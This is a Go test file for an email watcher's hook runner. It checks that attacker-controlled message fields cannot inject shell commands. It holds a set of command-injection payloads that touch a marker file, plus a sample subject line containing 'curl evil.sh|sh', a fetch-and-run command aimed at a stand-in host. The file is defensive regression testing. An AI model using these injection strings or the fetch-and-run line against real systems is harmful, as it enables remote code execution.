package watch

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

// The cli/006 property, taken past the one payload cli006_test.go pins: EVERY
// interpolation point, under EVERY template shape a person actually writes.
//
// The point is not to enumerate metacharacters — that is the blocklist thinking
// the finding rejected. It is that the same three assertions hold for every
// combination, because the mechanism (fields in the environment, template in
// argv) does not have per-character behaviour to enumerate.

// payloads are the shapes that turn a subject line into code, each written so
// that FIRING is observable as a file appearing.
func payloads(marker string) map[string]string {
	return map[string]string{
		"command separator":  "x; touch " + marker,
		"pipeline":           "x | touch " + marker,
		"background":         "x & touch " + marker,
		"command list":       "x && touch " + marker,
		"substitution $()":   "$(touch " + marker + ")",
		"substitution ``":    "`touch " + marker + "`",
		"subshell":           "(touch " + marker + ")",
		"newline":            "x\ntouch " + marker,
		"redirect":           "x > " + marker,
		"quote break":        `x" ; touch ` + marker + ` ; echo "`,
		"single quote break": `x' ; touch ` + marker + ` ; echo '`,
	}
}

// templates are the shapes an operator writes, INCLUDING the two that were RCE
// under the old contract: an unquoted legacy placeholder, and an unquoted
// expansion. The unquoted expansion is the interesting one — it word-splits, and
// it still must not re-parse, because the shell does not re-scan the RESULT of
// an expansion for metacharacters.
var templates = map[string]string{
	"legacy placeholder, unquoted": "printf %s {subject}",
	"legacy placeholder, quoted":   `printf %s "{subject}"`,
	"expansion, unquoted":          "printf %s $BM_SUBJECT",
	"expansion, quoted":            `printf %s "$BM_SUBJECT"`,
	"expansion in a substitution":  `printf %s "$(printf %s "$BM_SUBJECT")"`,
	"expansion, from":              `printf %s "$BM_FROM"`,
	"expansion, preview":           `printf %s "$BM_PREVIEW"`,
	"expansion, id":                `printf %s "$BM_ID"`,
	"expansion, account":           `printf %s "$BM_ACCOUNT"`,
}

// fieldSetters puts the payload in one field at a time: every field is
// attacker-controlled, and `{id}` in particular bypassed the old sanitizer
// entirely, so "the id is ours, it is safe" is exactly the assumption to refuse.
var fieldSetters = map[string]func(*HookFields, string){
	"id":      func(f *HookFields, v string) { f.ID = v },
	"account": func(f *HookFields, v string) { f.Account = v },
	"from":    func(f *HookFields, v string) { f.From = v },
	"subject": func(f *HookFields, v string) { f.Subject = v },
	"preview": func(f *HookFields, v string) { f.Preview = v },
}

// Test_cli006_EveryInterpolationPointUnderEveryTemplate is the cross product:
// 5 fields × 11 payloads × 9 templates, each run through a REAL shell.
func Test_cli006_EveryInterpolationPointUnderEveryTemplate(t *testing.T) {
	for fieldName, set := range fieldSetters {
		for payloadName, payload := range payloads("PWNED") {
			for templateName, template := range templates {
				t.Run(fieldName+"/"+payloadName+"/"+templateName, func(t *testing.T) {
					dir := t.TempDir()
					marker := filepath.Join(dir, "pwned")
					fields := HookFields{
						ID: "e_1", Account: "you@example.com", From: "Stranger",
						Subject: "hello", Preview: "body",
					}
					set(&fields, strings.ReplaceAll(payload, "PWNED", marker))

					plan, err := BuildHookPlan(template, fields)
					if err != nil {
						t.Fatalf("BuildHookPlan: %v", err)
					}

					// (1) The argv is the template and nothing else. No escaping
					// decision was made, so none can be made wrongly.
					if plan.Command != "sh" || len(plan.Args) != 2 ||
						plan.Args[0] != "-c" || plan.Args[1] != template {
						t.Fatalf("argv = %q %q, want sh -c <template verbatim>", plan.Command, plan.Args)
					}
					if strings.Contains(plan.Args[1], marker) {
						t.Fatalf("the payload reached argv: %q", plan.Args[1])
					}

					// (2) Running it creates no file, whatever the payload was.
					cmd := exec.Command(plan.Command, plan.Args...)
					cmd.Env = envPairs(plan.Env)
					if err := cmd.Run(); err != nil {
						// A non-zero exit is fine (the operator's own template may
						// fail); a shell that never ran is not.
						var exitErr *exec.ExitError
						if !errors.As(err, &exitErr) {
							t.Fatalf("hook did not run: %v", err)
						}
					}
					if _, statErr := os.Stat(marker); statErr == nil {
						t.Fatalf("REMOTE CODE EXECUTION: the hook parsed field %q and created %s",
							fieldName, marker)
					}
				})
			}
		}
	}
}

// Test_cli006_FieldsSurviveIntactInTheEnvironment is the other half of the
// property, and it is why the fix is not "strip dangerous characters": the value
// the hook receives is the sender's bytes EXACTLY, so a template that wants to
// print a subject containing a semicolon gets the semicolon.
func Test_cli006_FieldsSurviveIntactInTheEnvironment(t *testing.T) {
	const nasty = "x; curl evil.sh|sh $(id) `whoami` \"quoted\" 'single' \n newline"
	plan, err := BuildHookPlan(`printf %s "$BM_SUBJECT"`, HookFields{Subject: nasty})
	if err != nil {
		t.Fatalf("BuildHookPlan: %v", err)
	}
	if plan.Env["BM_SUBJECT"] != nasty {
		t.Errorf("BM_SUBJECT = %q, want the sender's bytes unaltered %q — escaping the value would corrupt legitimate mail",
			plan.Env["BM_SUBJECT"], nasty)
	}
	cmd := exec.Command(plan.Command, plan.Args...)
	cmd.Env = envPairs(plan.Env)
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("hook run: %v", err)
	}
	if string(out) != nasty {
		t.Errorf("hook printed %q, want the subject verbatim %q", out, nasty)
	}
}

// Test_HookPreviewIsTruncated: a 5 MB body must not be pushed into the
// environment, where it would blow E2BIG and break the hook for every message.
func Test_HookPreviewIsTruncated(t *testing.T) {
	plan, err := BuildHookPlan("true", HookFields{Preview: strings.Repeat("z", 5000)})
	if err != nil {
		t.Fatalf("BuildHookPlan: %v", err)
	}
	if got := len(plan.Env["BM_PREVIEW"]); got != HookPreviewMax {
		t.Errorf("BM_PREVIEW is %d bytes, want %d", got, HookPreviewMax)
	}
}

// Test_HookPreviewTruncationKeepsValidUTF8: cutting at a byte offset can split a
// multi-byte rune. JS's slice() splits UTF-16 units and can leave a lone
// surrogate; reproducing THAT is not fidelity, it is a second bug.
func Test_HookPreviewTruncationKeepsValidUTF8(t *testing.T) {
	// 40 three-byte runes = 120 bytes exactly, then one more to force a cut
	// inside a rune.
	preview := strings.Repeat("あ", 41)
	plan, err := BuildHookPlan("true", HookFields{Preview: preview})
	if err != nil {
		t.Fatalf("BuildHookPlan: %v", err)
	}
	got := plan.Env["BM_PREVIEW"]
	if len(got) > HookPreviewMax {
		t.Errorf("BM_PREVIEW is %d bytes, over the %d cap", len(got), HookPreviewMax)
	}
	if !utf8.ValidString(got) {
		t.Errorf("BM_PREVIEW is not valid UTF-8 after truncation: %q", got)
	}
}

// Test_EmptyExecIsRefused: `--exec ""` would run `sh -c ""` once per message
// forever, silently.
func Test_EmptyExecIsRefused(t *testing.T) {
	for _, tmpl := range []string{"", "   ", "\n"} {
		if _, err := BuildHookPlan(tmpl, HookFields{}); err == nil {
			t.Errorf("BuildHookPlan(%q) was accepted; an empty hook is a typo", tmpl)
		}
	}
}

// Test_LegacyPlaceholdersAreReportedNotSubstituted: the retired placeholders are
// recognised ONLY so watch can warn. Substituting them is the vulnerability.
func Test_LegacyPlaceholdersAreReportedNotSubstituted(t *testing.T) {
	got := LegacyPlaceholders(`notify-send "{from}: {subject}"`)
	if strings.Join(got, " ") != "{from} {subject}" {
		t.Errorf("LegacyPlaceholders = %v, want {from} {subject}", got)
	}
	if len(LegacyPlaceholders(`notify-send "$BM_FROM: $BM_SUBJECT"`)) != 0 {
		t.Error("a template on the new contract was warned about")
	}
	// And the warning path does not change the plan.
	plan, err := BuildHookPlan("echo {subject}", HookFields{Subject: "hi"})
	if err != nil {
		t.Fatalf("BuildHookPlan: %v", err)
	}
	if plan.Args[1] != "echo {subject}" {
		t.Errorf("template was rewritten to %q", plan.Args[1])
	}
}

// Test_HookGetsNoStdin: watch.ts:109 closes it, so a hook can never steal the
// terminal from an interactive watcher.
func Test_HookGetsNoStdin(t *testing.T) {
	plan, err := BuildHookPlan("cat; echo done", HookFields{})
	if err != nil {
		t.Fatalf("BuildHookPlan: %v", err)
	}
	cmd := exec.Command(plan.Command, plan.Args...)
	cmd.Env = envPairs(plan.Env)
	cmd.Stdin = nil // what RunHook sets
	done := make(chan []byte, 1)
	go func() {
		out, _ := cmd.Output()
		done <- out
	}()
	select {
	case out := <-done:
		if strings.TrimSpace(string(out)) != "done" {
			t.Errorf("hook output %q, want `done` — cat should have read EOF immediately", out)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the hook blocked reading stdin — RunHook must give it none")
	}
}
